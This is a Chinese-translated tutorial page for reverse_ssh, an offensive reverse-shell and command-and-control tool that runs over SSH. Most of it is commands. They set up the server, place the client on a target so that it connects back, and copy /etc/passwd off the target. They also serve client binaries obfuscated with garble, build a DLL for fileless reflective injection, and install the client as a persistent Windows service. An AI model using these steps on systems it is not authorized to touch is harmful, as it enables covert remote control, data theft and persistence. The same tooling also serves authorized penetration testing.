# 反向 SSH:基于 SSH 的反向 Shell

> 原文：<https://kalilinuxtutorials.com/reverse_ssh/>

[![](img/1357c513f9f7d09ea49c1adba915acda.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSBFaZ_YindAKVIU8hcuQvE_pUjULzGKoHoqYZoRH9w1RW1thrim59G4Xd8K_acUYxmjUPJx2V_PFHwi74L1OLHt3PtqvYjTjOxtsEFIuzrPVoQ3qeKnoPhibf1iNDlI0exvnDmQ2n70CWHdKT0Hxq7Rks3wWQn2ZM_SDek6UP3nyXbcU4johoe1wz/s728/Reverse%20SSH.png)

想用 SSH 做反向外壳？现在你可以使用 reverse_SSH。

*   使用原生 SSH 语法管理和连接反向 shells
*   动态、本地和远程转发
*   用于从目标中检索文件的本地 SCP 和 SFTP 实现
*   完整的 windows 外壳
*   相互客户端和服务器认证，创建高度信任的控制通道
    等等！

## 设置

**Docker:**

```
docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your_external_address>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v data:/data reversessh/reverse_ssh
```

**手动:**

```
git clone https://github.com/NHAS/reverse_ssh

cd reverse_ssh

make
cd bin/

# start the server
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232
```

## 跑步

```
# copy client to your target then connect it to the server
./client your.rssh.server.com:3232

# Get help text
ssh your.rssh.server.com -p 3232 help

# See clients
ssh your.rssh.server.com -p 3232 ls -t

                                Targets
+------------------------------------------+------------+-------------+
| ID                                       | Hostname   | IP Address  |
+------------------------------------------+------------+-------------+
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
+------------------------------------------+------------+-------------+

# Connect to full shell
ssh -J your.rssh.server.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac

# Or using hostname 

ssh -J your.rssh.server.com:3232 root.wombo

```

## 设置说明

**注意:** reverse_ssh 要求 Go **1.17** 或更高版本。请通过`go version`检查您是否至少拥有该版本

最简单的构建命令是:

```
make
```

Make 将构建`client`和`server`二进制文件。它还会为`client`生成一个私钥，并将对应的公钥复制到`authorized_controllee_keys`文件中，使反向 shell 能够连接。

Golang 允许您毫不费力地进行交叉编译，下面是一个构建窗口的示例:

```
GOOS=windows GOARCH=amd64 make client # will create client.exe
```

你需要创建一个`authorized_keys`文件，很像 ssh[http://man.he.net/man5/authorized_keys](http://man.he.net/man5/authorized_keys)，其中包含*你的*公钥。这将允许您连接到 RSSH 服务器。

或者，您可以使用–authorized keys 标志指向一个文件。

```
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232 #Set the server to listen on port 3232
```

将客户端二进制文件放在您想要控制的地方，然后连接到服务器。

```
./client your.rssh.server.com:3232
```

然后，您可以使用`ls`查看哪些反向 shells 连接到了您:

```
ssh your.rssh.server.com -p 3232 ls -t
                                Targets
+------------------------------------------+------------+-------------+
| ID                                       | Hostname   | IP Address  |
+------------------------------------------+------------+-------------+
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
+------------------------------------------+------------+-------------+

```

然后典型的 ssh 命令工作，只需指定您的 rssh 服务器作为跳转主机。

```
# Connect to full shell
ssh -J your.rssh.server.com:3232 root.wombo

# Run a command without pty
ssh -J your.rssh.server.com:3232 root.wombo help

# Start remote forward 
ssh -R 1234:localhost:1234 -J your.rssh.server.com:3232 root.wombo

# Start dynamic forward 
ssh -D 9050 -J your.rssh.server.com:3232 root.wombo

# SCP 
scp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .

#SFTP
sftp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .

```

## 奇特的特征

### 默认服务器

在构建时指定默认服务器:

```
$ RSSH_HOMESERVER=your.rssh.server.com:3232 make

# Will connect to your.rssh.server.com:3232, even though no destination is specified
$ bin/client

# Behaviour is otherwise normal; will connect to the supplied host, e.g example.com:3232
$ bin/client example.com:3232
```

### 内置网络服务器

RSSH 服务器还可以在为客户机二进制文件提供服务的 RSSH 服务器监听器所在的端口上运行 HTTP 服务器。服务器必须放在项目`bin/`文件夹中，因为它需要找到客户机源。

```
./server --webserver :3232

# Generate an unnamed link
ssh your.rssh.server.com -p 3232

catcher$ link -h

link [OPTIONS]
Link will compile a client and serve the resulting binary on a link which is returned.
This requires the web server component has been enabled.
	-t	Set number of minutes link exists for (default is one time use)
	-s	Set homeserver address, defaults to server --external_address if set, or server listen address if not.
	-l	List currently active download links
	-r	Remove download link
	--goos	Set the target build operating system (default to runtime GOOS)
	--goarch	Set the target build architecture (default to runtime GOARCH)
	--name	Set link name
	--shared-object	Generate shared object file
  --fingerprint Set RSSH server fingerprint will default to server public key
  --upx   Use upx to compress the final binary (requires upx to be installed)
  --garble	Use garble to obfuscate the binary (requires garble to be installed)

# Build a client binary
catcher$ link --name test
http://your.rssh.server.com:3232/test

```

然后你可以下载如下:

```
wget http://your.rssh.server.com:3232/test
chmod +x test
./test
```

### Windows DLL 生成

您可以将客户端编译成 DLL，加载类似于[Invoke-reflective peinjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)的东西。这将需要一个交叉编译器，如果你在 linux 上这样做，使用`mingw-w64-gcc`。

```
CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll
```

当 RSSH 服务器启用了 web 服务器时，您也可以使用 link 命令编译它:

```
./server --webserver :3232

# Generate an unnamed link
ssh your.rssh.server.com -p 3232

catcher$ link --name windows_dll --shared-object --goos windows
http://your.rssh.server.com:3232/windows_dll

```

这在您想要对 rssh 客户端进行无文件注入时非常有用。

### SSH 子系统

SSH 生态系统允许使用`-s`标志来定义和调用子系统。在 RSSH 中，这是为了给平台提供特殊的命令。

#### 全部

`list`列出可用子系统
`sftp`:运行 sftp 处理程序传输文件

#### Linux

`setgid`:试图改变组
`setuid`:试图改变用户

#### Windows

`service`:安装或删除作为 windows 服务的 rssh 二进制文件，需要管理权限

例如

```
# Install the rssh binary as a service (windows only)
ssh -J your.rssh.server.com:3232 test-pc.user.test-pc -s service --install
```

### Windows 服务集成

客户端 RSSH 二进制文件支持在 windows 服务中运行，不会在 10 秒后超时。这对于创建持久的管理服务非常有用。

### 完整的 Windows Shell 支持

大多数用于 windows 的反向 shell 都难以生成一个支持调整大小、复制和粘贴以及所有其他我们都非常喜欢的功能的 shell 环境。这个项目在新版本的 windows 上使用 conpty，在旧版本的 windows 上使用 winpty 库(可以自行解包)。这意味着几乎所有版本的 windows 都会给你一个漂亮的外壳。

### Webhooks

RSSH 服务器可以从终端接口发送使用`webhook`命令设置的原始 HTTP 请求。

首先启用 webhook:

```
$ ssh your.rssh.server.com -p 3232
catcher$ webhook --on http://localhost:8080/
```

然后断开或连接一个客户端，这将在发出一个具有以下格式的`POST`请求时发生。

```
$ nc -l -p 8080
POST /rssh_webhook HTTP/1.1
Host: localhost:8080
User-Agent: Go-http-client/1.1
Content-Length: 165
Content-Type: application/json
Accept-Encoding: gzip

{"Status":"connected","ID":"ae92b6535a30566cbae122ebb2a5e754dd58f0ca","IP":"[::1]:52608","HostName":"user.computer","Timestamp":"2022-06-12T12:23:40.626775318+12:00"}%  
```

### Tuntap

RSSH 和 SSH 支持创建 tuntap 接口，允许您路由流量和创建伪 VPN。这确实比本地或远程转发需要更多的设置(`-L`、`-R`)，但是在这种模式下你可以发送`UDP`和`ICMP`。

首先在您本地机器上设置一个调谐器(第 3 层)设备。

```
sudo ip tuntap add dev tun0 mode tun
sudo ip addr add 172.16.0.1/24 dev tun0
sudo ip link set dev tun0 up

# This will defaultly route all non-local network traffic through the tunnel
sudo ip route add 0.0.0.0/0 via 172.16.0.1 dev tun0

```

在一台*远程*机器上安装一个客户端，如果你的 RSSH 客户端和你的 tun 设备在同一个主机上，这个**将不工作**。

```
ssh -J your.rssh.server.com:3232 user.wombo -w 0:any

```

这有一些限制，它只能发送 UDP/TCP/ICMP，而不能发送任意的第 3 层协议。ICMP 是最大的努力，可以使用远程主机`ping`工具，因为 ICMP 套接字在大多数机器上是有特权的。这也不支持`tap`设备，例如第 2 层 VPN，因为这需要管理访问。

## 救命

### 乱码

要在`link`命令中启用`--garble`标志，你必须安装 garble，一个用于混淆 golang 二进制文件的系统。然而`@latest`版本有一个 bug，会导致通用代码的恐慌。
如果您要手动安装，请使用以下方法:

```
go install mvdan.cc/garble@f9d9919
```

然后确保`go/bin/`目录在您的`$PATH`中

### 权限被拒绝(公钥)。

不幸的是，golang `crypto/ssh`上游库不支持`rsa-sha2-*`算法，这方面的工作目前正在进行:

[golang/go#49952](https://github.com/golang/go/issues/49952)

因此，在这项工作完成之前，您必须生成一个不同的(非 rsa)密钥。我建议如下:

```
ssh-keygen -t ed25519

```

### Windows 和 SFTP

由于 SFTP 的限制(或者更确切地说是我使用的库)。路径在 windows 上需要多一点努力。

```
sftp -r -J your.rssh.server.com:3232 test-pc.user.test-pc:'/C:/Windows/system32'
```

注意起始字符前的`/`。

### 前景与背景(关于客户的重要说明)

默认情况下，客户端将在后台运行。启动时，它们将执行一个新的后台实例(从而派生出一个新的子进程)，然后父进程将退出。如果分叉成功，将打印“结束父项”消息。

这有一个重要的衍生:一旦在后台，客户端将不会显示任何输出，包括连接失败消息。如果您需要调试您的客户端，请使用`--foreground`标志。

[Click Here To Download](https://github.com/NHAS/reverse_ssh)